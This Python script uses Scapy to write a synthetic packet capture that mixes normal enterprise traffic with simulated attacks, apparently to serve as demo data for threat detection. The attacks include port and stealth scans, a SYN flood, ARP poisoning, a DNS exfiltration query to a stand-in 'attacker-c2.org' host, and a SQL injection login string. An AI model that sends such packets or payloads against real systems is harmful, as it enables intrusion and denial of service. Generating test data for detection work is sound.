"""
Realistic PCAP Traffic Generator & Threat Simulation Script
===========================================================
Generates a multi-scenario .pcap capture file containing legitimate enterprise
traffic alongside orchestrated network anomalies (SYN Flood, Port Scan,
Stealth Scans, ARP Poisoning, DNS Exfiltration, and SQL Injection payloads).
"""

import sys
import os
import time
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, DNSRR, Raw, wrpcap
)

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples", "demo_traffic.pcap")


def generate_traffic():
    print(f"[*] Generating synthetic network capture: {OUTPUT_FILE} ...")
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    packets = []
    base_time = time.time() - 60.0

    cli_mac = "00:11:22:33:44:55"
    rtr_mac = "aa:bb:cc:dd:ee:ff"
    atk_mac = "de:ad:be:ef:13:37"

    # 1. Legitimate DNS queries & responses
    print("  [+] Generating legitimate DNS and HTTP web traffic...")
    for i in range(10):
        t = base_time + i * 0.4
        dns_req = Ether(src=cli_mac, dst=rtr_mac) / \
                  IP(src="192.168.1.50", dst="8.8.8.8") / \
                  UDP(sport=51200 + i, dport=53) / \
                  DNS(rd=1, qd=DNSQR(qname=f"api{i}.service.internal"))
        dns_req.time = t
        packets.append(dns_req)

        dns_resp = Ether(src=rtr_mac, dst=cli_mac) / \
                   IP(src="8.8.8.8", dst="192.168.1.50") / \
                   UDP(sport=53, dport=51200 + i) / \
                   DNS(qr=1, aa=1, qd=DNSQR(qname=f"api{i}.service.internal"),
                       an=DNSRR(rrname=f"api{i}.service.internal", rdata="104.21.45.10"))
        dns_resp.time = t + 0.015
        packets.append(dns_resp)

    # 2. Legitimate HTTP Web Traffic (3-Way Handshake + HTTP GET + Response)
    for i in range(5):
        t = base_time + 10.0 + i * 0.8
        sport = 42000 + i
        syn = Ether(src=cli_mac, dst=rtr_mac) / IP(src="192.168.1.50", dst="104.21.45.10") / TCP(sport=sport, dport=80, flags="S", seq=1000)
        syn.time = t
        synack = Ether(src=rtr_mac, dst=cli_mac) / IP(src="104.21.45.10", dst="192.168.1.50") / TCP(sport=80, dport=sport, flags="SA", seq=5000, ack=1001)
        synack.time = t + 0.02
        ack = Ether(src=cli_mac, dst=rtr_mac) / IP(src="192.168.1.50", dst="104.21.45.10") / TCP(sport=sport, dport=80, flags="A", seq=1001, ack=5001)
        ack.time = t + 0.04
        http_data = f"GET /index.html HTTP/1.1\r\nHost: portal.company.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        req = Ether(src=cli_mac, dst=rtr_mac) / IP(src="192.168.1.50", dst="104.21.45.10") / TCP(sport=sport, dport=80, flags="PA", seq=1001, ack=5001) / Raw(load=http_data.encode())
        req.time = t + 0.05
        packets.extend([syn, synack, ack, req])

    # 3. Legitimate ICMP Diagnostics (Ping)
    for i in range(4):
        t = base_time + 18.0 + i * 0.5
        ping = Ether(src=cli_mac, dst=rtr_mac) / IP(src="192.168.1.50", dst="192.168.1.1") / ICMP(type=8, code=0, id=100, seq=i)
        ping.time = t
        pong = Ether(src=rtr_mac, dst=cli_mac) / IP(src="192.168.1.1", dst="192.168.1.50") / ICMP(type=0, code=0, id=100, seq=i)
        pong.time = t + 0.002
        packets.extend([ping, pong])

    # 4. THREAT 1: Vertical Port Scan from Attacker (192.168.1.99)
    print("  [+] Injecting Vertical Port Scan threat traffic...")
    scan_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
    scan_time = base_time + 25.0
    for idx, p in enumerate(scan_ports):
        probe = Ether(src=atk_mac, dst=rtr_mac) / IP(src="192.168.1.99", dst="192.168.1.100") / TCP(sport=55000 + idx, dport=p, flags="S")
        probe.time = scan_time + idx * 0.05
        packets.append(probe)

    # 5. THREAT 2: Stealth Scans (NULL scan and XMAS scan)
    print("  [+] Injecting NULL and XMAS stealth scan probes...")
    null_pkt = Ether(src=atk_mac, dst=rtr_mac) / IP(src="192.168.1.99", dst="192.168.1.100") / TCP(sport=55100, dport=80, flags=0)
    null_pkt.time = base_time + 28.0
    xmas_pkt = Ether(src=atk_mac, dst=rtr_mac) / IP(src="192.168.1.99", dst="192.168.1.100") / TCP(sport=55101, dport=80, flags="FPU")
    xmas_pkt.time = base_time + 28.2
    packets.extend([null_pkt, xmas_pkt])

    # 6. THREAT 3: SYN Flood Attack (High-rate incomplete handshakes)
    print("  [+] Injecting TCP SYN Flood DoS attack stream...")
    flood_time = base_time + 32.0
    for i in range(25):
        syn_flood = Ether(src=atk_mac, dst=rtr_mac) / IP(src="192.168.1.200", dst="192.168.1.100") / TCP(sport=1024 + i, dport=443, flags="S", seq=i * 100)
        syn_flood.time = flood_time + i * 0.03
        packets.append(syn_flood)

    # 7. THREAT 4: ARP Spoofing / Poisoning (MAC address conflict)
    print("  [+] Injecting ARP Cache Poisoning conflict packets...")
    arp_legit = Ether(src="00:50:56:c0:00:01", dst="ff:ff:ff:ff:ff:ff") / \
                ARP(op=2, hwsrc="00:50:56:c0:00:01", psrc="192.168.1.1", hwdst="00:11:22:33:44:55", pdst="192.168.1.50")
    arp_legit.time = base_time + 5.0
    packets.insert(0, arp_legit)

    # Poisoning attack: Attacker MAC claims Gateway IP 192.168.1.1
    arp_poison = Ether(src=atk_mac, dst="ff:ff:ff:ff:ff:ff") / \
                 ARP(op=2, hwsrc=atk_mac, psrc="192.168.1.1", hwdst="00:11:22:33:44:55", pdst="192.168.1.50")
    arp_poison.time = base_time + 38.0
    packets.append(arp_poison)

    # 8. THREAT 5: DNS Exfiltration / Tunneling (High-entropy base64 subdomain)
    print("  [+] Injecting DNS covert exfiltration / tunneling query...")
    tunnel_sub = "dGhpcy1pcy1hLXNlY3JldC1leGZpbHRyYXRpb24tdG9rZW4tZGF0YS1wYXlsb2FkCg"
    dns_tunnel = Ether(src=cli_mac, dst=rtr_mac) / IP(src="192.168.1.50", dst="8.8.8.8") / UDP(sport=53321, dport=53) / \
                 DNS(rd=1, qd=DNSQR(qname=f"{tunnel_sub}.attacker-c2.org"))
    dns_tunnel.time = base_time + 42.0
    packets.append(dns_tunnel)

    # 9. THREAT 6: SQL Injection & Cleartext Credential in HTTP Payload
    print("  [+] Injecting Application-Layer SQLi and Credential leak payloads...")
    sqli_payload = "GET /login?username=admin' OR '1'='1&password=supersecretpassword123 HTTP/1.1\r\nHost: vuln-app.com\r\n\r\n"
    sqli_pkt = Ether(src=atk_mac, dst=rtr_mac) / IP(src="192.168.1.99", dst="192.168.1.100") / TCP(sport=59200, dport=80, flags="PA", seq=2000) / Raw(load=sqli_payload.encode())
    sqli_pkt.time = base_time + 45.0
    packets.append(sqli_pkt)

    # Sort packets strictly by timestamp
    packets.sort(key=lambda p: getattr(p, "time", 0))

    wrpcap(OUTPUT_FILE, packets)
    print(f"[OK] Successfully generated {len(packets)} packets in: {OUTPUT_FILE}")
    return OUTPUT_FILE


if __name__ == "__main__":
    generate_traffic()
